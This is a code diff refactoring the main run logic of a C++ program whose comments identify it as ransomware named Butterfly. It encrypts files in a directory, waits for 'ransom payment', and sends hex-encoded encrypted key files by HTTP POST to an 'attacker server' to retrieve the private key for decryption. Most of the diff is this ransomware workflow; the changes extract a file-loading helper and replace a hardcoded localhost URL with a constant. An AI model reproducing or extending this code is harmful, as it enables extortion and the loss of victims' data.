@@ -1,7 +1,6 @@
 
 #include "butterfly.h"
 
-
 namespace butterfly
 {
 
@@ -44,15 +43,44 @@ void Butterfly::initLoggingFramework()
     #endif
 }
 
+void Butterfly::loadEncryptedFiles(std::string &cprivateRSAFileHex, std::string &rsaFileHex)
+{
+    if ( butterfly::existsFile(butterfly::ENC_CPRIVATERSA_FILENAME) )
+    {
+        if ( butterfly::existsFile(butterfly::RSA_EKIV_FILENAME) )
+        {
+            // Convert bin files to hex
+            std::string cprivatersa_bin = butterfly::readBinFile(butterfly::ENC_CPRIVATERSA_FILENAME);
+            std::string rsa_bin = butterfly::readBinFile(butterfly::RSA_EKIV_FILENAME);
+
+            cprivateRSAFileHex = butterfly::string2Hex(cprivatersa_bin);
+            rsaFileHex = butterfly::string2Hex(rsa_bin);
+
+        } else
+        {
+            #ifdef LOGGING
+            LOG_ERROR("File not found " << butterfly::RSA_EKIV_FILENAME);
+            #endif
+            throw FileNotFoundException("File not found " + butterfly::RSA_EKIV_FILENAME);
+        }
+    } else
+    {
+        #ifdef LOGGING
+        LOG_ERROR("File not found " << butterfly::ENC_CPRIVATERSA_FILENAME)
+        #endif
+        throw FileNotFoundException("File not found " + butterfly::ENC_CPRIVATERSA_FILENAME);
+    }
+}
+
 void Butterfly::run()
 {
 
     // Start Hybrid Encryption Mechanism (Encryption + Remote Server Request + Decryption)
     if ( !_args.dir.empty() )
     {
+        std::cout << "Start Encryption+Decryption from directory " << _args.dir << std::endl;
         // Start encryption
         std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
-        std::cout << "Start Encryption+Decryption from directory " << _args.dir << std::endl;
         encryptor->invokeDir(_args.dir, _args.protection);
 
         // After encryption start http server, gui or wallpaper
@@ -62,7 +90,10 @@ void Butterfly::run()
 
         // Wait for ransom payment
 
-        // Create HTTP Get Request to bflyServerApp to get the decrypted CPrivateRSA.pem string
+        // Create HTTP Post Request to bflyServerApp to get the decrypted CPrivateRSA.pem string
+        std::string cprivateRSAFileHex, rsaFileHex;
+        loadEncryptedFiles(cprivateRSAFileHex, rsaFileHex);
+
 
         // Start decryption
         std::shared_ptr<butterfly::hybrid::Decryptor> decryptor = std::make_shared<butterfly::hybrid::Decryptor>();
@@ -72,9 +103,9 @@ void Butterfly::run()
     // Start only Encryption
     else if ( !_args.encrypt.empty() )
     {
+        std::cout << "Start Encryption from directory " << _args.encrypt << std::endl;
 
         std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
-        std::cout << "Start Encryption from directory " << _args.encrypt << std::endl;
         encryptor->invokeDir(_args.encrypt, _args.protection);
 
     }
@@ -83,61 +114,39 @@ void Butterfly::run()
     {
         std::cout << "Start Decryption from directory " << _args.decrypt << std::endl;
 
-        if ( butterfly::existsFile(butterfly::ENC_CPRIVATERSA_FILENAME) )
-        {
-            if ( butterfly::existsFile(butterfly::RSA_EKIV_FILENAME) )
-            {
-                // Convert bin files to hex
-                std::string cprivatersa_bin = butterfly::readBinFile(butterfly::ENC_CPRIVATERSA_FILENAME);
-                std::string rsa_bin = butterfly::readBinFile(butterfly::RSA_EKIV_FILENAME);
+        std::string cprivateRSAFileHex, rsaFileHex;
+        loadEncryptedFiles(cprivateRSAFileHex, rsaFileHex);
 
-                std::string cprivatersa_hex = butterfly::string2Hex(cprivatersa_bin);
-                std::string rsa_hex = butterfly::string2Hex(rsa_bin);
-
-                // ConnManager instance to check whether internet is available for the POST request to the attacker server or not
-                std::unique_ptr<butterfly::ConnManager> connManager(new butterfly::ConnManager());
-                while ( !connManager->isInternetAvailable() )
-                {
-                    #ifdef LOGGING
-                    LOG_ERROR("Please check your internet connection!");
-                    #else
-                    std::cout << "Please check your internet connection!" << std::endl;
-                    #endif
-                    sleep(5);
-                }
-
-                // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
-                std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient(5000));
-                httpClient->setFormParam("CPrivateRSA.bin", cprivatersa_hex);
-                httpClient->setFormParam("RSA.bin", rsa_hex);
-                std::string decryptedCPrivateRSAStr = httpClient->post("http://localhost:5000/decryption/");
-
-                // Decryptor instance to invoke the directory for the decryption process
-                std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
-                decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
-                decryptor->invokeDir(_args.decrypt);
-
-            } else
-            {
-                #ifdef LOGGING
-                LOG_ERROR("File not found " << butterfly::RSA_EKIV_FILENAME);
-                #endif
-                throw FileNotFoundException("File not found " + butterfly::RSA_EKIV_FILENAME);
-            }
-        } else
+        // ConnManager instance to check whether internet is available for the POST request to the attacker server or not
+        std::unique_ptr<butterfly::ConnManager> connManager(new butterfly::ConnManager());
+        while ( !connManager->isInternetAvailable() )
         {
             #ifdef LOGGING
-            LOG_ERROR("File not found " << butterfly::ENC_CPRIVATERSA_FILENAME)
+            LOG_ERROR("Decryption is not possible due to missing internet connection!");
+            #else
+            std::cout << "Decryption is not possible due to missing internet connection!" << std::endl;
             #endif
-            throw FileNotFoundException("File not found " + butterfly::ENC_CPRIVATERSA_FILENAME);
+            sleep(5);
         }
+
+        // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
+        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient(5000));
+        httpClient->setFormParam(butterfly::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex);
+        httpClient->setFormParam(butterfly::RSA_EKIV_FILENAME, rsaFileHex);
+        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::REMOTE_DECRYPTION_URL);
+
+        // Decryptor instance to invoke the directory for the decryption process
+        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
+        decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
+        decryptor->invokeDir(_args.decrypt);
 
     }
     // Start Decryption with provided key
-    else if ( !_args.decrypt.empty() && !_args.serverpKey.empty())
+    else if ( !_args.decrypt.empty() && !_args.serverpKey.empty() )
     {
-        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
         std::cout << "Start Decryption with provided key " << _args.serverpKey << " from directory " << _args.decrypt << std::endl;
+
+        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
         decryptor->decryptCPrivateRSA(_args.serverpKey, butterfly::ENC_CPRIVATERSA_FILENAME);
         decryptor->invokeDir(_args.decrypt);
     }
